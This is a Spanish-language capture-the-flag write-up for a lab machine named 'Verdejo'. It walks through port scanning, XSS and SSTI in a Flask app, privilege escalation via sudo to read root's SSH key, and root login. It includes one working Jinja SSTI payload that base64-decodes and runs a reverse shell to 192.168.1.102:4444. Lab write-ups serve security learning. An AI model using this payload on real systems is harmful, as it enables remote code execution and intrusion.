# RESOLUCIÓN DE LA MÁQUINA VERDEJO

Abrimos la máquina y vemos su IP.

![image](https://github.com/user-attachments/assets/459326a7-0e73-4dd2-b07f-c79cb6e67cb5)

Hacemos un nmap para poder ver los puertos que estan abiertos para la IP seleccionada.

![image](https://github.com/user-attachments/assets/00d2ac8a-6093-4074-aede-ea3d5868a86b)

Ahora hacemos un escaneo de los puertos que hemos visto que estan abiertos para saber servicios,versiones...

![image](https://github.com/user-attachments/assets/7c139d4e-6e82-4c70-81ec-2294a43320f1)

Abrimos la web, puerto 80.

![image](https://github.com/user-attachments/assets/163e874b-9f41-45ca-a75a-d1525bf6fc29)

Abrimos el puerto 8089 y nos muestra esto:

![image](https://github.com/user-attachments/assets/0c07a60d-6f09-4a14-8e4a-5a4a33436d3a)

Hacemos xss.

![image](https://github.com/user-attachments/assets/c7442128-d366-4ff7-912b-c799b0f1f802)

Y nos salta el alert, así que ya sabemos que la web es vulnerable a Cross-Site Scripting (XSS).

![image](https://github.com/user-attachments/assets/0ecf16ab-b600-486c-abda-7653fadbad5e)

También es vulnerable a SSTI.

![image](https://github.com/user-attachments/assets/30013e5b-a935-4ead-84a9-b78ccbfd6ba6)

![image](https://github.com/user-attachments/assets/00a80c44-b31a-4119-80ba-93ca1f9ccb5f)

Flask: Es un framework web minimalista para Python que proporciona herramientas para construir aplicaciones web rápidas y eficientes. Flask utiliza Jinja como su motor de plantillas predeterminado y Werkzeug como su biblioteca de manejo de solicitudes HTTP.

Sabiendo que es vulnerable a SSTI intentamos inyectar código para que nos de el id.

Esta es la web para el código que hay que usarm sabiendo que se está usando jinja: 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2---basic-injection

![image](https://github.com/user-attachments/assets/ebbc52eb-a7d8-4d4d-bd03-ac1bf198a37a)

Miramos los usuarios que hay, utilizando el /etc/passwd, y vemos solo al usuario verde.

![image](https://github.com/user-attachments/assets/43a2100a-1032-4137-bc8f-d7136aa2ab93)

Hacemos una revershell desde el cuestionario de la web y ganamos acceso.

![image](https://github.com/user-attachments/assets/bfca1e9a-620a-4d35-8e5c-8a675fd5c89f)

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjEwMi80NDQ0IDA+JjE= | base64 -d | bash').read() }}

![image](https://github.com/user-attachments/assets/5f385b87-11c1-4e2c-ae36-7f7ca877193e)

Hacemos sudo -l y vemos esto: 

![image](https://github.com/user-attachments/assets/ccea011a-be39-47d6-be64-cb10fcc209e6)

El comando que vamos a usar nos permite leer el archivo id_rsa, este lee el archivo especificado con privilegios de superusuario, lo codifica en base64 y luego lo decodifica de nuevo, devolviéndolo a su forma original.

![image](https://github.com/user-attachments/assets/368f0d0e-1493-41cf-9458-72a189e32e0c)

Nos copiamos el id_rsa en nuestro equipo y seguimos los siguientes pasos para poder craquear la contraseña.

![image](https://github.com/user-attachments/assets/f4118bda-79c1-4b0b-9f9d-90d3d3e0e08d)

Seguidamente le damos permisos para que el propietario pueda leer y escribir.

![image](https://github.com/user-attachments/assets/14a670d8-d70e-4b01-9063-92ee2019c1ee)

Nos conectamos al servicio ssh como root con las credenciales obtenidas.

![image](https://github.com/user-attachments/assets/a547b572-0a7e-466c-a9be-6c17f4021de0)








